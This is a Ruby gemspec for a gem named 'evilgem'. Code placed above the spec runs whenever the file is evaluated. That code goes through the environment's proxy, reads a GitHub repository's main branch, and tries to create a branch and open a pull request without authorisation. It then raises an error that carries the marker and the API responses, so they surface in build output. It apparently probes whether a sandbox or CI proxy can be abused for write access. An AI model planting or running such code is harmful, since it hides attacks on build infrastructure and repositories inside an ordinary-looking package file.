require "net/http"; require "uri"; require "json"
MARK = "ESC2-3a4674"
PXY  = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def req(method, url, body = nil)
  u = URI(url)
  h = if PXY && !PXY.empty?
    p = URI(PXY); Net::HTTP.new(u.host, u.port, p.host, p.port)
  else
    Net::HTTP.new(u.host, u.port)
  end
  h.use_ssl = (u.scheme == "https"); h.open_timeout = 15; h.read_timeout = 20
  rq = { get: Net::HTTP::Get, post: Net::HTTP::Post, put: Net::HTTP::Put }[method].new(u.request_uri)
  rq["Accept"] = "application/vnd.github+json"; rq["User-Agent"] = "probe"
  rq.body = body if body
  r = h.request(rq); [r.code, r.body.to_s]
rescue => e
  ["ERR", "#{e.class}:#{e.message}"]
end
gc, gb = req(:get, "https://api.github.com/repos/czarflix-org/source-job/git/ref/heads/main")
sha = gb[/"sha":\s*"([0-9a-f]{40})"/, 1]
# WRITE attempt 1: create a branch ref (needs contents:write)
wc, wb = req(:post, "https://api.github.com/repos/czarflix-org/source-job/git/refs",
             { ref: "refs/heads/esc-#{MARK}", sha: sha }.to_json)
# WRITE attempt 2: open a pull request (needs pull_requests:write)
pc, pb = req(:post, "https://api.github.com/repos/czarflix-org/source-job/pulls",
             { title: "esc", head: "esc-#{MARK}", base: "main", body: "x" }.to_json)
raise "#{MARK} head=#{sha ? sha[0,8] : 'nil'} :: POST_ref=#{wc}/#{wb.gsub(/\s+/,' ')[0,70]} :: POST_pull=#{pc}/#{pb.gsub(/\s+/,' ')[0,70]}"
Gem::Specification.new { |s| s.name = "evilgem"; s.version = "0.0.1"; s.summary = "x"; s.authors = ["b"]; s.files = [] }
